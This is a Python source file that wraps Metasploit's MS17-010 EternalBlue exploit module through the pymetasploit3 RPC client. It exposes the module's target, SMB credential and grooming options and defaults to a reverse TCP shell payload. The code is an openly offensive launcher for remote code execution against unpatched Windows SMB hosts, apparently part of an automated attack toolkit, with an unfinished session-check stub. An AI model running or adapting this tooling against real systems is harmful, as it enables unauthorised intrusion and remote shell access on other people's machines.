from pymetasploit3.msfrpc import MsfRpcClient

from libs.Payloads import Payloads
from libs.modules.Basic import Basic


class Eternalblue(Basic):
    option_keys: list[str] = ['RHOSTS', 'CHOST', 'CPORT', 'ConnectTimeout', 'ContextInformationFile',
                              'DisablePayloadHandler', 'EnableContextEncoding', 'GroomAllocations', 'GroomDelta',
                              'MaxExploitAttempts', 'ProcessName', 'Proxies', 'RPORT', 'SMBDomain', 'SMBPass',
                              'SMBUser', 'SSL', 'SSLCipher', 'SSLServerNameIndication', 'SSLVerifyMode', 'SSLVersion',
                              'TCP__max_send_size', 'TCP__send_delay', 'VERBOSE', 'VERIFY_ARCH', 'VERIFY_TARGET',
                              'WORKSPACE', 'WfsDelay']

    def __init__(self, rpc: MsfRpcClient, RHOSTS: str, /,
                 payload=Payloads.REVERSE_TCP, CHOST=None, CPORT=None, ConnectTimeout=None, ContextInformationFile=None,
                 DisablePayloadHandler=None, EnableContextEncoding=None, GroomAllocations=None, GroomDelta=None,
                 MaxExploitAttempts=None, ProcessName=None, Proxies=None, RPORT=None, SMBDomain=None, SMBPass=None,
                 SMBUser=None, SSL=None, SSLCipher=None, SSLServerNameIndication=None, SSLVerifyMode=None,
                 SSLVersion=None, TCP__max_send_size=None, TCP__send_delay=None, VERBOSE=None, VERIFY_ARCH=None,
                 VERIFY_TARGET=None, WORKSPACE=None, WfsDelay=None
                 ):
        """

        :param rpc:
        :param RHOSTS:
        :param payload:
        :param CHOST:
        :param CPORT:
        :param ConnectTimeout:
        :param ContextInformationFile:
        :param DisablePayloadHandler:
        :param EnableContextEncoding:
        :param GroomAllocations:
        :param GroomDelta:
        :param MaxExploitAttempts:
        :param ProcessName:
        :param Proxies:
        :param RPORT:
        :param SMBDomain:
        :param SMBPass:
        :param SMBUser:
        :param SSL:
        :param SSLCipher:
        :param SSLServerNameIndication:
        :param SSLVerifyMode:
        :param SSLVersion:
        :param TCP__max_send_size:
        :param TCP__send_delay:
        :param VERBOSE:
        :param VERIFY_ARCH:
        :param VERIFY_TARGET:
        :param WORKSPACE:
        :param WfsDelay:
        """

        super().__init__(rpc, 'windows/smb/ms17_010_eternalblue', payload)

        for i in self.option_keys:
            if locals().get(i) is not None:
                self.set_option(i, locals().get(i))

    async def run(self):
        response = await super()._run()
        await self.trigger('on_read', response)

    def check_session(self):
        # TODO: 檢查連是否成功
        pass
